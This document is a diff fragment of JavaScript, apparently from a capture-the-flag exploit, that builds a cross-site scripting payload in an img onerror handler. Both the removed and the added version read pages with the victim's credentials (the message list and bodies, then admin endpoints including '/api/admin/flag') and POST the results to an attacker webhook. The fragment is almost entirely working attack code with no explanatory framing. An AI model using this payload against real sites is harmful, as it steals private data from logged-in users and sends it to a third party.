@@ -14,28 +14,28 @@
               '/api/admin/flag',
               '/admin/api/messages',
             ];
-
             const payload = `<img src=x onerror="
               async function run() {
                 const WEBHOOK = '${WEBHOOK}';
                 
-                // Get full message list
-                const msgs = await fetch('/api/messages', {credentials:'include'}).then(r=>r.json());
-                
-                // Fetch ALL bodies in parallel — don't wait between them
-                const bodies = await Promise.all(
-                  msgs.map(m => fetch('/api/messages/'+m.id, {credentials:'include'}).then(r=>r.json()))
+                const results = await Promise.all(
+                  ${JSON.stringify(endpoints)}.map(async ep => {
+                    const res = await fetch(ep, {credentials:'include'});
+                    const text = await res.text();
+                    return {ep, status: res.status, text};
+                  })
                 );
                 
-                // Single exfil with everything
                 await fetch(WEBHOOK, {
                   method: 'POST',
                   mode: 'no-cors',
-                  body: JSON.stringify({total: msgs.length, bodies})
+                  keepalive: true,
+                  body: JSON.stringify(results)
                 });
               }
               run();
             ">`;
+
             document.getElementById("f").onload = () => {
                 document
                     .getElementById("f")
